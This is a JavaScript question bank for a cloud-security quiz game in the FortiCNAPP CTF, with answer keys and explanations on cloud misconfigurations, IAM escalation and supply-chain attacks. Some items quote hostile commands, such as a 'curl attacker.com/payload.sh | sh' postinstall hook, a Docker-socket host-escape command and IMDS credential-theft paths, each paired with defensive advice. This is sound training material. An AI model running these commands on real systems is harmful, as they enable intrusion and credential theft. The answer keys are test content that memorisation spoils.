// FortiCNAPP CTF — Knowledge CNAPP Game — question bank
// Served as a static file at /themes/core/static/custom/wheel-questions.js
const WG_QUESTIONS = {
  50: [
    { q: "What does CNAPP stand for?",
      o: ["Cloud Native Application Protection Platform","Cloud Network Access Point Protocol","Cyber Network Application Platform","Cloud Native Access Protection Policy"],
      a: 0, x: "CNAPP integrates CSPM, CWPP, CIEM, and CDR into one unified platform — the backbone of modern cloud security." },
    { q: "What does CSPM stand for?",
      o: ["Cloud Service Protection Mechanism","Cloud Security Posture Management","Cyber Security Platform Manager","Cloud System Policy Monitor"],
      a: 1, x: "CSPM continuously monitors cloud configurations for misconfigurations and compliance drift across AWS, Azure, and GCP." },
    { q: "Which AWS service logs every API call made in your account?",
      o: ["AWS Config","AWS Inspector","AWS CloudTrail","AWS GuardDuty"],
      a: 2, x: "CloudTrail captures the who, what, when, and from where of every AWS API call — essential for threat detection and forensics." },
    { q: "In cloud security, what is 'least privilege'?",
      o: ["Encrypting all data at rest","Using the cheapest cloud tier","Granting only the minimum permissions needed for a task","Disabling unused cloud regions"],
      a: 2, x: "Least privilege limits blast radius: if credentials are compromised, an attacker can only do what that identity was allowed to do." },
    { q: "What does CVE stand for?",
      o: ["Cloud Vulnerability Exploit","Critical Vulnerability Event","Cyber Vulnerability Enumeration","Common Vulnerabilities and Exposures"],
      a: 3, x: "CVEs are standardized IDs for publicly known security vulnerabilities tracked in the National Vulnerability Database (NVD)." },
    { q: "What does CWPP stand for?",
      o: ["Cloud Web Protection Protocol","Cyber Workload Policy Platform","Cloud Workload Protection Platform","Cloud Workflow Prevention Protocol"],
      a: 2, x: "CWPP provides visibility and protection for cloud workloads — virtual machines, containers, and serverless functions." },
    { q: "What is a cloud 'misconfiguration'?",
      o: ["An incorrectly written application code bug","An insecure cloud service setting that exposes resources","A failed cloud deployment","A network routing outage"],
      a: 1, x: "Misconfigurations (open S3 buckets, permissive security groups, disabled logging) are the #1 cause of cloud data breaches." },
    { q: "What does CIEM stand for?",
      o: ["Cloud Identity and Entitlements Management","Cloud Infrastructure Event Monitoring","Cyber Identity Enforcement Module","Cloud Infrastructure Entitlements Management"],
      a: 3, x: "CIEM discovers and right-sizes excessive cloud permissions across IAM users, roles, and service principals." },
    { q: "What does 'SBOM' stand for in supply chain security?",
      o: ["Software Bill of Materials","Secure Binary Object Management","System Build Object Monitor","Software Base Operating Model"],
      a: 0, x: "An SBOM lists every software component and dependency in an artifact — essential for assessing supply chain exposure after incidents like SolarWinds and log4shell." },
    { q: "What is 'dependency confusion' in a supply chain attack?",
      o: ["A build crash from circular imports","Uploading a malicious public package with the same name as a private internal package","Deleting shared libraries to break builds","Using deprecated package versions"],
      a: 1, x: "Attackers publish a public package named identically to a private one. Package managers prefer public registries, silently pulling the malicious version on the next build." },
    { q: "What is 'secrets sprawl'?",
      o: ["Too many IAM roles across accounts","API keys and passwords scattered across code repos, CI/CD logs, and container image layers","Uncontrolled S3 bucket proliferation","Excessive cloud region expansion"],
      a: 1, x: "Secrets in git history persist forever — automated scanners find leaked AWS keys within seconds of a push. GitGuardian data shows the median time to exploit a leaked key is under 60 s." },
    { q: "What does 'shift left' mean in cloud security?",
      o: ["Moving workloads to western cloud regions","Integrating security checks earlier — in the IDE and CI pipeline, before code reaches production","Reducing security team headcount","Migrating from public cloud to on-premises"],
      a: 1, x: "Fixing a misconfiguration in the IDE costs nothing. Fixing it after a breach costs millions. Shift-left embeds IaC scanning, SAST, and SCA into the developer workflow." },
    { q: "What is 'container image hardening'?",
      o: ["Increasing container CPU limits","Removing unnecessary packages, running as non-root, using a minimal base image","Encrypting container volumes at rest","Enabling container auto-restart policies"],
      a: 1, x: "A hardened image has fewer packages → fewer CVEs. Non-root execution limits blast radius. Multi-stage builds strip build tools from the final image. FortiCNAPP scans for violations at every layer." },
    { q: "What is 'runtime security' in cloud workload protection?",
      o: ["Monitoring running containers and VMs for anomalous process, network, and file behaviour in real time","Restricting cloud API calls at runtime","Applying security patches during business hours","Network firewall rules enforced at runtime"],
      a: 0, x: "Runtime security catches threats that pre-deploy scanning misses — injected malware, unexpected processes, reverse shells. FortiCNAPP CWPP detects these behavioural anomalies without a kernel agent." },
    { q: "What is 'image tag mutability' and why is it dangerous?",
      o: ["The ability to rename container image files","An image tag like :latest can be reassigned to a different image — enabling tag poisoning attacks","A Kubernetes image pull policy setting","A container image compression feature"],
      a: 1, x: "Attacker compromises a registry and reassigns :prod to a malicious image. Your next deploy pulls the backdoored version. Mitigate by pinning images to immutable digest hashes (sha256:...)." },
    { q: "What is 'zero-trust' in cloud security?",
      o: ["Trust all traffic inside the corporate network perimeter","Never trust, always verify — every request is authenticated and authorised regardless of origin","Trust only traffic from known IP ranges","Trust cloud provider default security configurations"],
      a: 1, x: "Zero-trust assumes breach: authenticate every user, device, and service call — even internal ones. Microsegmentation and least-privilege IAM are its two most important cloud implementations." },
  ],
  100: [
    { q: "An S3 bucket has 'Block Public Access' disabled. What is the primary risk?",
      o: ["Data at rest is unencrypted","Any internet user can read or write the bucket contents","S3 lifecycle policies stop working","Bucket replication fails"],
      a: 1, x: "Public S3 buckets are among the most common cloud data leak causes. Always enable Block Public Access at the account level." },
    { q: "What MITRE ATT&CK tactic describes gaining higher permissions in a cloud account?",
      o: ["Initial Access (TA0001)","Lateral Movement (TA0008)","Collection (TA0009)","Privilege Escalation (TA0004)"],
      a: 3, x: "TA0004 Privilege Escalation covers IAM role chaining, PassRole abuse, and misconfigured policies enabling attacker admin escalation." },
    { q: "What CVSS score range is considered 'Critical'?",
      o: ["7.0–8.9","6.0–7.9","9.0–10.0","8.0–9.9"],
      a: 2, x: "CVSS Critical (9.0–10.0) vulnerabilities require immediate patching — unauthenticated remote code execution typically scores here." },
    { q: "What makes a Kubernetes privileged container dangerous?",
      o: ["It uses more CPU than standard containers","It runs as a non-root user","It cannot be monitored by CWPP","It has host kernel access, enabling container escape"],
      a: 3, x: "A privileged container has CAP_SYS_ADMIN and can mount host filesystems, load kernel modules, and escape to the underlying node." },
    { q: "What is 'Cloud Detection and Response' (CDR)?",
      o: ["Blocking malicious traffic at the cloud firewall","Automated cloud resource backup","Compliance reporting for infrastructure","Detecting threats in cloud using activity logs and ML"],
      a: 3, x: "CDR ingests CloudTrail/Azure Activity/GCP Audit logs, applies behavioral ML, and detects credential misuse and data exfiltration." },
    { q: "A compliance report shows 'CloudTrail not enabled in all regions: FAIL.' What is the attacker risk?",
      o: ["VPC peering stops working","Performance degradation on API calls","An attacker can operate undetected in unmonitored regions","Billing errors on unmonitored services"],
      a: 2, x: "Attackers provision resources in regions without CloudTrail to operate undetected. Enable CloudTrail globally with log file validation." },
    { q: "What is the difference between agentless and agent-based workload scanning?",
      o: ["They are identical technologies","Agentless uses network probes; agent uses DNS","Agentless uses cloud APIs/snapshots; agent provides deeper runtime visibility","Agentless is faster; agent is more accurate"],
      a: 2, x: "Agentless (FortiCNAPP's default) deploys instantly with no workload impact; agents add runtime detection for maximum depth." },
    { q: "Which IAM best practice most reduces blast radius after credential theft?",
      o: ["Using long, complex passwords","Multi-factor authentication on all privileged accounts","Rotating access keys every 90 days","Enabling CloudTrail in all regions"],
      a: 1, x: "MFA protects privileged accounts from credential phishing and stuffing. Without it, a stolen password means full account access." },
    { q: "A developer commits an AWS access key to a public GitHub repo. How fast is the typical time-to-compromise?",
      o: ["Several weeks after manual discovery","Under 60 seconds — automated bots scan GitHub for leaked credentials","Only if a threat actor specifically targets that developer","Months, because GitHub notifies the developer first"],
      a: 1, x: "GitGuardian and Truffle Security data show stolen keys are exploited within seconds by credential-harvesting bots. Rotate immediately, audit usage in CloudTrail, and enable git-secrets pre-commit hooks." },
    { q: "A GitHub Actions workflow uses a broad OIDC token to deploy to production AWS. What is the attack path?",
      o: ["No risk — GitHub OIDC tokens are short-lived","A malicious pull-request workflow step can exfiltrate the OIDC token and assume the production IAM role","Risk only exists in private repositories","GitHub Actions cannot access AWS IAM"],
      a: 1, x: "Fork PRs can trigger OIDC-issuing workflows. If the IAM role trust policy uses sub:* instead of a specific workflow path, any repo in the org can assume that production role." },
    { q: "What makes 'build poisoning' attacks (e.g., SolarWinds) so effective?",
      o: ["They exploit zero-days in the target operating system","Malicious code is injected into a legitimate, digitally-signed build artifact that customers install while trusting the vendor signature","They require physical access to build servers","They rely on employee phishing to reach each victim"],
      a: 1, x: "The Orion/SUNBURST attack compromised SolarWinds' TeamCity build server. The backdoor was compiled into signed software distributed to 18,000+ orgs — trust in the update mechanism was the entire attack surface." },
    { q: "What is DAST and where does it fit in a CNAPP pipeline?",
      o: ["Database Access Security Tool — monitors query patterns","Dynamic Application Security Testing — tests a running application by sending live attack payloads","Distributed Availability Security Testing","Data Asset Security Tracker"],
      a: 1, x: "DAST probes the live app (like a pen tester) to find injection, auth bypass, and SSRF that static analysis misses. CNAPP combines DAST, SAST, SCA, and IaC scanning into a single developer-facing pipeline." },
    { q: "What is Kubernetes RBAC and why is its misconfiguration dangerous?",
      o: ["A backup system for etcd","Role-Based Access Control — defines what users and service accounts can do in a cluster; wildcards or cluster-admin bindings are critical misconfigs","A container networking plugin","A Kubernetes persistent storage driver"],
      a: 1, x: "Wildcard RBAC (* verbs, * resources) or unnecessary cluster-admin bindings give attackers full cluster control if they compromise any bound identity. FortiCNAPP CSPM flags these instantly." },
    { q: "A CI/CD runner has an IAM role. A supply chain attack compromises the runner. What is the blast radius?",
      o: ["Limited to the build artifact output","Full access to every AWS resource the IAM role can reach — potentially cross-account if trust relationships exist","Limited to the current VPC","Only S3 buckets used by the pipeline"],
      a: 1, x: "CI/CD runners are trusted compute with cloud credentials. Compromising a runner is equivalent to compromising its IAM role. If that role can assume cross-account production roles, the blast radius extends to production." },
    { q: "What is 'VPC endpoint' and how does it harden data-plane security?",
      o: ["A cloud VPN connection endpoint","Allows services to communicate privately without traversing the public internet, enabling tighter resource policies using aws:SourceVpc conditions","A virtual NIC for EC2 instances","A DNS resolver for private hosted zones"],
      a: 1, x: "Without VPC endpoints, traffic to S3, DynamoDB etc. leaves the VPC over the internet. Private endpoints eliminate that exposure and allow bucket policies that reject any request not originating from the VPC." },
    { q: "What is 'Terraform state file exposure' and why is it critical?",
      o: ["A Terraform version compatibility issue","The state file tracks all provisioned resources and may contain secrets, passwords, and sensitive outputs in plaintext — storing it in a public S3 bucket exposes your entire infrastructure","A Terraform provider authentication error","A Terraform module dependency conflict"],
      a: 1, x: "Terraform state contains resource attributes as plain JSON, including secrets passed as variables and sensitive outputs. An exposed state file gives an attacker a full blueprint of your infrastructure plus credentials." },
  ],
  150: [
    { q: "A container makes outbound connections to a crypto-mining pool on port 3333. What MITRE ATT&CK technique is this?",
      o: ["T1078 — Valid Accounts","T1190 — Exploit Public-Facing Application","T1048 — Exfiltration Over Alternative Protocol","T1496 — Resource Hijacking"],
      a: 3, x: "T1496 Resource Hijacking: attackers abuse victim compute for cryptomining. Port 3333 is the standard Stratum mining protocol port." },
    { q: "FortiCNAPP alerts: 'New binary executed in container not present in original image.' What does this indicate?",
      o: ["A routine software update via package manager","Normal CI/CD hot-deployment","Container filesystem drift — possible malware injection or active compromise","A configuration management issue"],
      a: 2, x: "Image drift detection catches attackers who download tools (nc, curl, bash scripts) into a running container post-deployment." },
    { q: "An AWS IAM role policy contains '\"Action\":\"*\",\"Resource\":\"*\"'. What is the immediate risk?",
      o: ["The role cannot be assumed cross-account","CloudTrail won't log this role's actions","The role will expire automatically","The role has full admin access to all AWS services and resources"],
      a: 3, x: "Wildcard IAM policies are a critical misconfiguration. Stolen credentials give an attacker complete AWS account control." },
    { q: "CSPM flags 'Security Group allows 0.0.0.0/0 inbound on port 22 (SSH).' What attack does this enable?",
      o: ["DNS poisoning attacks","SQL injection","ARP spoofing within VPC subnets","Internet-wide SSH brute force and credential stuffing"],
      a: 3, x: "Open SSH to the internet means any attacker can attempt authentication. Restrict to known IPs or use AWS Session Manager instead." },
    { q: "FortiCNAPP detects rapid API calls: GetCallerIdentity, ListBuckets, DescribeInstances, ListRoles — all from a new IP in 60 seconds. What phase is this?",
      o: ["Persistence (TA0003)","Exfiltration (TA0010)","Initial Access (TA0001)","Discovery / Reconnaissance (TA0007)"],
      a: 3, x: "TA0007 Discovery: an attacker with freshly stolen credentials maps the environment before moving laterally. Classic cloud enumeration pattern." },
    { q: "CVE-2021-4034 (PwnKit, CVSS 7.8) affects 200 Linux hosts. Why is this critical even for low-privilege users?",
      o: ["It enables remote code execution without authentication","It only affects Docker containers","Any local user — including container processes — can escalate to root","It only impacts Windows workloads"],
      a: 2, x: "PwnKit is a local privilege escalation in pkexec. A compromised container process can exploit it to gain root on the host node." },
    { q: "An alert fires: 'Process curl executing from /tmp, connecting to 185.x.x.x:4444.' What is this?",
      o: ["A routine software download","DNS resolution failure","A legitimate health check endpoint","A reverse shell establishing a command-and-control channel"],
      a: 3, x: "/tmp execution + unusual outbound port = classic reverse shell. Port 4444 is common for Metasploit/netcat C2. Immediate isolation required." },
    { q: "A CSPM finding: 'Root account has active access keys.' Why is this critical?",
      o: ["Root access keys are slower than IAM user keys","Root access keys cannot be rotated once created","Root access keys only work in us-east-1","Root access keys bypass all IAM policies and provide unrestricted account access"],
      a: 3, x: "Root access keys bypass SCPs, permission boundaries, and all guardrails. They must never exist — use IAM roles instead." },
    { q: "The SolarWinds/SUNBURST attack was a supply chain breach. What was the injection point?",
      o: ["A zero-day in AWS CloudFormation","Malicious code was injected directly into the SolarWinds Orion build pipeline, shipped as a signed software update to 18,000+ customers","An unpatched Windows Server vulnerability","Mass phishing of SolarWinds customers"],
      a: 1, x: "Cozy Bear (APT29) compromised SolarWinds' TeamCity CI server and injected SUNBURST into the Orion build process. The backdoor shipped in a cryptographically-signed update — victims had no reason to suspect it." },
    { q: "A FortiCNAPP alert fires: 'Workload queried 169.254.169.254 unexpectedly.' What is the attack chain?",
      o: ["Normal instance health check traffic","SSRF exploitation: attacker tricks the web app into requesting the IMDS endpoint, retrieving the attached IAM role's temporary credentials","Container orchestration health probe","DNS resolution for an internal load balancer"],
      a: 1, x: "SSRF → IMDS → IAM credential theft is a top cloud attack chain. The fetched credentials work just like long-term keys. Mitigate with IMDSv2 (token-required, 1-hop TTL) and disable IMDSv1 entirely." },
    { q: "An attacker uses `sts:AssumeRole` to pivot from a compromised dev account into a production account. What is this?",
      o: ["A legitimate DevOps automation pattern","Cross-account lateral movement — exploiting trust relationships in IAM role policies intended for CI/CD or monitoring tooling","An AWS service misconfiguration error","An IAM permission boundary violation"],
      a: 1, x: "Cross-account roles designed for automation become attack paths when a dev account is compromised. Detect with CloudTrail sts:AssumeRole events; remediate by scoping trust policies to specific external IDs and source accounts." },
    { q: "A popular npm package is compromised via maintainer account takeover and a malicious version is published. Who is affected?",
      o: ["Only the package maintainer","All downstream applications that run npm install — the malicious version is pulled automatically on the next build","Only projects that explicitly updated to the new version","Only applications with no package-lock.json"],
      a: 1, x: "event-stream (2018), ua-parser-js (2021), node-ipc (2022) — account takeover on a high-download package affects millions of apps at install time. Defence: SBOM scanning, package integrity hashes, private registry mirroring." },
    { q: "A Lambda function is compromised via code injection. It has GetSecretValue on all secrets. What happens next?",
      o: ["Nothing — Lambda execution is sandboxed","The attacker bulk-reads Secrets Manager, exfiltrating DB passwords, API keys, and service tokens — FortiCNAPP's ML detects the velocity anomaly (47 secrets in 3 s)","The attacker can only read the specific secrets the function normally accesses","Lambda cannot call Secrets Manager"],
      a: 1, x: "Serverless functions often have overly broad Secrets Manager policies. One compromised function reads every secret the role can access. FortiCNAPP's baseline detects the unusual access velocity and triggers an alert." },
    { q: "What is a Kubernetes admission controller and how does it prevent supply chain attacks?",
      o: ["A Kubernetes authentication plugin","A webhook that intercepts API server requests to enforce policies — e.g., blocking unsigned images, privileged pods, or host-path mounts before resources are created","A Kubernetes network policy engine","A Kubernetes persistent volume provisioner"],
      a: 1, x: "OPA Gatekeeper / Kyverno can enforce: only signed images (Sigstore/Cosign), no :latest tags, no privileged containers, no host mounts. Stopping the bad image before it runs is better than detecting it at runtime." },
    { q: "A developer's postinstall script in package.json runs `curl attacker.com/payload.sh | sh`. What type of attack is this?",
      o: ["A misconfigured npm script","Supply chain execution via postinstall hook — installs backdoor silently on every npm install across all downstream consumers","A developer productivity tool","A legitimate CI/CD deployment step"],
      a: 1, x: "npm postinstall hooks execute automatically with the installing user's privileges. Malicious packages abuse this to download and execute payloads. Mitigate with --ignore-scripts in production and SBOM scanning in CI." },
    { q: "What is 'Kubernetes service account token theft' and how does an attacker use it?",
      o: ["Stealing Kubernetes admin credentials from etcd","Reading the auto-mounted /var/run/secrets/kubernetes.io/serviceaccount/token from inside a pod, then using it to call the Kubernetes API with the pod's RBAC permissions","Stealing kubeconfig files from developer machines","Intercepting Kubernetes dashboard traffic"],
      a: 1, x: "Every pod auto-mounts a service account token. If the SA has broad RBAC permissions, an attacker who gains shell in the pod can call kubectl list secrets --all-namespaces and read every secret in the cluster." },
  ],
  200: [
    { q: "An attacker has iam:PassRole and lambda:CreateFunction permissions. How do they escalate to admin?",
      o: ["They cannot escalate with only these two permissions","They use PassRole to directly assume any existing role","They create a Lambda with a more privileged role attached, execute it, and operate as that role","They modify the trust policy of an existing role"],
      a: 2, x: "PassRole + CreateFunction = Lambda PrivEsc. Attacker attaches a high-privilege role to a new Lambda, invokes it, and gains admin access without direct IAM changes." },
    { q: "What is a 'confused deputy' attack in AWS cross-account access?",
      o: ["An IAM user impersonating an admin via stolen session tokens","MFA bypass via session token replay attack","An attacker assumes a role using stolen access keys","A trusted service is manipulated into unauthorized actions via overly permissive resource policies"],
      a: 3, x: "Fix: use aws:SourceAccount and aws:SourceArn conditions in resource-based policies to bind trust to the specific caller, not just the account." },
    { q: "An attacker on an EC2 instance queries http://169.254.169.254/latest/meta-data/iam/security-credentials/. What is the goal?",
      o: ["Checking instance health metrics","Accessing VPC DNS for hijacking","Enumerating all S3 buckets in the region","Stealing temporary IAM credentials from the instance role for lateral movement"],
      a: 3, x: "IMDS credential theft: SSRF or code execution can harvest temporary role credentials. Mitigate with IMDSv2 (token-required hop limit)." },
    { q: "A container has /var/run/docker.sock mounted. An attacker gets a shell. What is the full attack chain?",
      o: ["No impact — the socket is read-only inside containers","Attacker can only monitor other container logs","Attacker can only create new containers in the same namespace","docker run --privileged -v /:/host mounts the host root filesystem for full host compromise"],
      a: 3, x: "Docker socket = Docker API access. `docker run -v /:/mnt alpine chroot /mnt` gives root on the host. Never mount the Docker socket." },
    { q: "What IAM persistence technique survives password rotation and access key deletion?",
      o: ["Creating additional IAM users with admin permissions","Enabling MFA on a compromised account","Adding a rogue OIDC Identity Provider mapped to existing IAM roles","Attaching an inline policy to a compromised user"],
      a: 2, x: "Federated backdoor: attacker adds a rogue OIDC/SAML IdP. Tokens from attacker's IdP assume IAM roles indefinitely. Detect via iam:list-open-id-connect-providers." },
    { q: "What is 'VPC Flow Log evasion' in attacker-controlled cloud network traffic?",
      o: ["Disabling VPC Flow Logs via IAM","Changing EC2 security groups to block logging","ARP poisoning within VPC subnets","Tunneling C2 over port 443 with encrypted protocols to blend with normal HTTPS traffic"],
      a: 3, x: "VPC Flow Logs record IP/port metadata, not payload. C2 over HTTPS/WSS on port 443 is indistinguishable without DNS monitoring and behavioral analytics." },
    { q: "An attacker has secretsmanager:GetSecretValue but no admin access. How do they escalate?",
      o: ["They cannot escalate without admin-level IAM permissions","By reading secrets containing database passwords, SSH keys, or API tokens that grant admin access to other systems or cross-account roles","By creating new IAM users via Secrets Manager","By modifying CloudTrail log destinations"],
      a: 1, x: "Secrets Manager stores the keys to your kingdom. DB credentials → RDS access → data exfiltration. SSH private keys → bastion host access. Cross-account role credentials → lateral movement. One GetSecretValue call can unlock the entire stack." },
    { q: "How does an overly permissive CDK bootstrap role enable privilege escalation?",
      o: ["CDK bootstrap has no IAM security implications","CDKToolkit creates a CloudFormation deployment role with AdministratorAccess — if the bootstrap stack exists in a dev account, it is a direct path to admin in any account that trusts it","CDK bootstrap creates public S3 buckets by default","CDK bootstrap disables CloudTrail logging in the region"],
      a: 1, x: "CDK bootstrap's default IAM role has AdministratorAccess for CloudFormation. In a multi-account org with dev→prod trust, a developer who can deploy CDK stacks in dev can abuse the role to access production. Scope bootstrap roles tightly." },
    { q: "Describe the 'confused deputy' attack in a multi-tenant SaaS supply chain scenario.",
      o: ["A misconfigured API load balancer routing requests to wrong tenants","A SaaS provider's cross-account IAM role is tricked into accessing one customer's resources on behalf of another via a manipulated request — without aws:SourceAccount conditions","A DNS hijacking attack targeting the SaaS provider","A misconfigured API gateway rate limit"],
      a: 1, x: "Fix: add aws:SourceAccount and aws:SourceArn conditions to every cross-account resource policy. Without them, attacker-controlled SaaS tenant X can trigger the provider's role to access tenant Y's S3 buckets." },
    { q: "A FortiCNAPP alert: 'Container spawned bash → wget pastebin.com → execute from /dev/shm.' What is the evasion technique?",
      o: ["A standard package manager update","Fileless malware execution — payload downloaded to a RAM-backed tmpfs, never written to disk, evading file-based AV and image scanning","A container health check script","A legitimate application debug session"],
      a: 1, x: "/dev/shm is a memory-mapped filesystem — no disk writes, no file hashes, no AV signatures. Runtime behavioural detection (FortiCNAPP CWPP) catches the chain: unexpected bash spawn + outbound connection + in-memory execution." },
    { q: "What is 'OIDC token injection' privilege escalation in CI/CD?",
      o: ["Injecting fake JWT tokens into application source code","Using OIDC federation to obtain cloud credentials by exploiting overly permissive IAM role trust policies that use wildcards instead of specific workflow paths","Stealing tokens from an OIDC identity provider","Injecting malicious code into an OIDC library"],
      a: 1, x: "GitHub Actions OIDC: if the IAM role trust policy has token.actions.githubusercontent.com:sub: * instead of repo:myorg/myrepo:ref:refs/heads/main, any GitHub Actions workflow in any repo can assume that role." },
    { q: "An attacker compromises a Terraform CI job and modifies the state backend. What is the maximum impact?",
      o: ["They can only destroy existing resources","They can modify state to inject resource definitions, redirect state reads to a malicious backend, or exfiltrate the state file containing all resource attributes and secrets — potentially rebuilding your entire infrastructure","They can only read existing Terraform plans","They can only delay future deployments"],
      a: 1, x: "Terraform state is the ground truth of your infrastructure. State poisoning can cause next-apply to delete critical resources, add backdoored compute, or change IAM policies. Protect state with: encrypted backend, strict IAM on the state bucket, and plan review in PRs." },
  ],
  250: [
    { q: "What is a 'Living off the Land' (LotL) attack in cloud environments, and why does it evade traditional detection?",
      o: ["Using cloud-native logging as a defensive technique","Attackers spin up free-tier accounts for attacks","Using only legitimate cloud APIs (no malware), blending with normal operations — evading signature-based detection","Exploiting misconfigurations without lateral movement"],
      a: 2, x: "Cloud LotL: AWS CLI, CloudFormation, Lambda, SSM — no malware, no AV/EDR alerts. All calls appear legitimate. Requires ML anomaly detection over baseline behavioral patterns." },
    { q: "What is 'Gold Image Poisoning' as a cloud supply chain attack?",
      o: ["Encrypting AMIs with attacker-controlled KMS keys","Modifying CloudFormation templates in shared repos","Injecting malicious Lambda layers into the ecosystem","Compromising a widely-used AMI/container image in a public registry so all derived workloads inherit a backdoor"],
      a: 3, x: "Attack chain: compromise Docker Hub / ECR image → inject cryptominer or backdoor → image deployed by thousands of orgs → runs with workload IAM permissions. Defense: image signing + CNAPP scanning at pull time." },
    { q: "An attacker creates an IAM user, immediately deletes it, and waits 10 minutes before proceeding. What is this technique?",
      o: ["Testing IAM quota limits","Cleaning up an accidental resource creation","Verifying account ID before attack","Canary probing — testing SOC detection speed and alerting gaps before launching the real attack"],
      a: 3, x: "Sophisticated attackers probe detection maturity before striking. No alert in 10 min = green light. Defenders must alert on IAM user creation with <5 min SLA, even for immediately-deleted users." },
    { q: "How does an attacker use AWS Lambda + SQS to build a persistent, stealthy C2 channel?",
      o: ["Lambda functions cannot make outbound network calls","SQS encryption prevents command reading by Lambda","Lambda timeout prevents persistent sessions","Commands encoded in SQS messages trigger Lambda; it executes using its IAM role — no inbound connections, blends with serverless workloads"],
      a: 3, x: "Serverless C2: attacker → SQS message → Lambda trigger → execution with IAM role → results to S3/DynamoDB → attacker reads results. Entirely event-driven, no listening ports. Detect via unusual Lambda IAM activity and cross-account SQS access." },
    { q: "A Kubernetes attacker in namespace 'dev' exploits a misconfigured ClusterRoleBinding. What is the full blast radius?",
      o: ["Only the dev namespace is affected","Only pod scheduling in the cluster is disrupted","The attack is limited to the same node pool","Full cluster compromise: all namespaces, secrets, service accounts, and the cloud account via node IAM roles"],
      a: 3, x: "ClusterRoleBinding with wildcards = cluster-admin. Attacker reads all secrets, execs into any pod, deploys privileged pods, escapes to host, and uses the node's cloud IAM role to attack S3, ECR, RDS, and beyond." },
    { q: "Walk through a CI/CD-to-production data exfiltration chain via supply chain compromise.",
      o: ["Supply chain attacks cannot reach production databases","Compromise CI runner → runner has IAM role → sts:AssumeRole into prod account → GetSecretValue for DB credentials → connect to RDS → dump customer data; all via legitimate AWS API calls, no malware dropped","Must separately compromise the production database server","Requires admin credentials to proceed beyond the CI environment"],
      a: 1, x: "This is the SolarWinds blast radius model applied to cloud-native pipelines. CI runners are trusted compute with cloud credentials. Dev-to-prod trust policies, shared IAM roles, and broad Secrets Manager access create a direct pipeline from supply chain compromise to customer data." },
    { q: "Describe a typosquatting + obfuscated eval supply chain attack against a Node.js application.",
      o: ["A simple typo in a configuration file with no security impact","Attacker publishes a package named `lodahs` (typo of `lodash`) with a postinstall script containing eval(Buffer.from('BASE64_PAYLOAD','base64').toString()) that beacons to C2 on every install","A JavaScript runtime syntax error","A package version downgrade that enables old vulnerabilities"],
      a: 1, x: "Obfuscated base64 eval in postinstall hooks bypasses casual code review. The payload runs with installer privileges on every npm install. Defence: SBOM scanning in CI, --ignore-scripts flag, private registry mirroring, Sigstore package signing." },
    { q: "A container escapes to the Kubernetes node. The node has an EC2 instance profile. Describe maximum blast radius.",
      o: ["Impact is contained to the current pod namespace","Container escape → host root → IMDS → EC2 instance role credentials → if the role is broad: full AWS account access; if cross-account trust exists: full AWS Organisation compromise via lateral role assumption","Access is limited to the current VPC CIDR","Requires separate credentials to move beyond the compromised node"],
      a: 1, x: "This is the full kill chain: pod exploit → container escape (privileged pod / CVE) → host → IMDSv1 (no token required) → EC2 role → sts:AssumeRole into production → S3/RDS/Secrets Manager. IMDSv2 enforcement and strict instance profiles are the critical mitigations." },
    { q: "What is the 'build-time vs. runtime' blind spot that supply chain attackers exploit?",
      o: ["Build-time scanners are always more effective than runtime detectors","Build-time scanners check known CVEs at image creation; attackers inject malicious code AFTER the scan phase (during push or signing) — runtime detection is the only control that catches this","Runtime scanners make build-time scanning unnecessary","Both scan at exactly the same point in the delivery pipeline"],
      a: 1, x: "The Codecov breach injected credential-harvesting code after CI passed. The window between scan and deploy is the supply chain's blind spot. FortiCNAPP's runtime CWPP detects anomalous behaviour — unexpected processes, outbound connections, file writes — that pre-deploy scanning cannot." },
    { q: "How does an attacker use a rogue OIDC provider to create persistent AWS access that survives credential rotation?",
      o: ["They store stolen OIDC tokens in S3 for reuse","Attacker registers a rogue OIDC IdP in the AWS account mapped to an existing IAM role — their identity provider issues tokens that the role trusts indefinitely, surviving all password and key rotations","They use OIDC tokens to create long-lived IAM users","They rotate the OIDC tokens automatically via Lambda"],
      a: 1, x: "Adding iam:CreateOpenIDConnectProvider is a persistence technique that survives all standard incident response actions (rotate keys, reset passwords, revoke sessions). The backdoor persists until the rogue IdP is removed. Detect via CloudTrail iam:CreateOpenIDConnectProvider events and audit trusted OIDC providers regularly." },
  ],
};
